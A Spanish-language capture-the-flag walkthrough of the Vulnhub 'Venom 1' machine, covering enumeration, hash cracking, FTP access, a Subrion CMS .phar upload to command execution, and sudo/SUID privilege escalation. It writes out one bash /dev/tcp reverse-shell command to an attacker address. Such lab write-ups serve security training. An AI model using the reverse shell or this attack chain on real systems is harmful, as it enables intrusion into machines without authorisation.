#vulnhub #ctf-machine #easy-machine #linux [Vulnhub Link](https://www.vulnhub.com/entry/venom-1,701/)

## Enumeración inicial
Primeramente tenemos que identificar la IPv4 de la máquina objetiva, para hacerlo hacemos un escaneo ARP con la herramienta `arp-scan`:
![[Pasted image 20240822164239.png]]

La IPv4 de la máquina víctima es la 192.168.159.139, ya que si nos fijamos en el OUI es "00:0c" propio de las máquinas que se importan en VMware. 

Si la lanzamos una trama ICMP con `ping` podemos decir que probablemente se trata de una máquina Linux por su TTL=64:
![[Pasted image 20240822164536.png]]

### Nmap
Hacemos un escaneo inicial con `nmap` para determinar los puertos TCP abiertos de la máquina víctima y lo exportamos en un archivo en formato "grepeable" con nombre "openPorts":
![[Pasted image 20240822164811.png]]

Podemos ver que hay 3 puertos abiertos, el puerto 21,80 y 443. Por lo que hacemos un segundo escaneo con `nmap` un poco más exhaustivo para determinar la versión y servicios que corren en estos puertos:
![[Pasted image 20240822165100.png]]

Podemos ver que se trata de un sistema Ubuntu. 

Si lanzamos un análisis con `whatweb` podemos información parecida que nos estaba indicando `nmap`:
![[Pasted image 20240822165450.png]]

## Enumeración web
Si accedemos a la web podemos ver que se trata de una página por defecto de Apache2:
![[Pasted image 20240822165531.png]]

Si analizamos el código de la página podemos encontrar lo siguiente al final del código:
![[Pasted image 20240822170450.png]]

Parece una especie de *hash* así que si utilizamos `hashid` nos dice lo siguiente:
![[Pasted image 20240822171110.png]]

Podemos probar de romperlo utilizando `crackstation`:
![[Pasted image 20240822171438.png]]

Podemos ver que nos indica que se trata "hostinger". Como el comentario ponia que sigamos esto para acceder a algún lado podemos probar de acceder mediante FTP a la máquina víctima con usuario "hostinger" y contraseña "hostinger":
![[Pasted image 20240822171630.png]]

Como podemos ver tenemos acceso. Si listamos el contenido que hay podemos ver que hay una carpeta "files" con un archivo dentro con nombre "hint.txt":
![[Pasted image 20240822171741.png]]

Por lo tanto utilizamos get para traernos el archivo a nuestra máquina:
![[Pasted image 20240822171922.png]]

Si analizamos el contenido de este archivo podemos ver lo siguiente:
![[Pasted image 20240822172013.png]]

Si nos fijamos las dos primeras cadenas de caracteres extraños parecen base 64 por lo que probamos de decodificarlas para saber de qué se trata:
![[Pasted image 20240822172159.png]]

Como vemos la cadena estaba codificada en base 64 varias veces, pero finalmente podemos ver que pone "standard vigenere chipher". Por lo tanto, hacemos lo mismo con la segunda cadena:
![[Pasted image 20240822172317.png]]

 El mensaje final, nos dice que desde la página web podemos descifrar la contraseña de "dora" por lo que probamos de descifrarla utilizando la *key* "hostinger":
![[Pasted image 20240822181841.png]]

Así que si probamos de acceder con el usuario dora con esta contraseña en "venom.box" conseguimos acceso:
![[Pasted image 20240822182238.png]]
![[Pasted image 20240822182326.png]]

## File Upload to RCE
Si entramos en el panel administrativo podemos ver que se trata de un CMS Subrion 4.2.1:
![[Pasted image 20240822182550.png]]

Por lo que sí buscamos *exploits* encontramos lo siguiente:
![[Pasted image 20240822184248.png]]

Si analizamos esta vulnerabilidad, nos permite subir un archivo ".phar" que es interpretado con PHP. Por lo tanto, subimos un archivo "cmd.phar" en el apartado de *uploads* del panel administrador que se encuentra en `panel/uploads`:
![[Pasted image 20240822184431.png]]

Por lo que si accedemos en `/uploads/cmd.phar` y utilizamos el parámetro "cmd" en la url podemos ejecutar comandos:
![[Pasted image 20240822184517.png]]

Así que nos podemos entablar una reverse shell utilizando el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.1.159.131/443 0>&1"
```

Y poniéndonos en escucha con `ncat` por el puerto 443 obtenemos acceso a la máquina:
![[Pasted image 20240822192608.png]]

Por lo tanto, hacemos el tratamiento de la TTY:
![[Pasted image 20240822192736.png]]
![[Pasted image 20240822192807.png]]

## Escalada de privilegios
Si listamos los usuarios que contienen una bash podemos ver 3:
![[Pasted image 20240822193626.png]]

Podemos probar de migrar a "hostinger" con la contraseña "hostinger" que antes nos havia funcionado con FTP:
![[Pasted image 20240822193712.png]]

Una vez como *hostinger* podemos ver que tenemos acceso a su ".bash_history":
![[Pasted image 20240822193756.png]]

Por lo que si lo leemos podemos ver que havia mostrado este archivo:
![[Pasted image 20240822193857.png]]

Si mostramos que contiene este archivo podemos ver lo que parece ser una contraseña:
![[Pasted image 20240822193939.png]]

Podemos probar de migrar al otro usuario llamado "nathan" con esta contraseña:
![[Pasted image 20240822194118.png]]

Una vez en el directorio de "nathan" podemos visualizar la primera *flag*:
![[Pasted image 20240822194156.png]]

Si listamos los permisos de "nathan" a nivel de *sudoers* vemos que tiene permisos de sudo para cualquier comando menos el binario "/bin/su" por lo que podemos escalar privilegios asignando permiso SUID  a la bash con `chmod`:
![[Pasted image 20240822194658.png]]

Y simplemente ejecutar `bash -p` para obtener una bash como *root*:
![[Pasted image 20240822194743.png]]

Finalmente, si accedemos al directorio `/root` podemos visualizar la última *flag*:
![[Pasted image 20240822194831.png]]


___
#file-upload-attacks #information-leakage #abusing-sudoers #hash-cracking #abusing-suid 
___

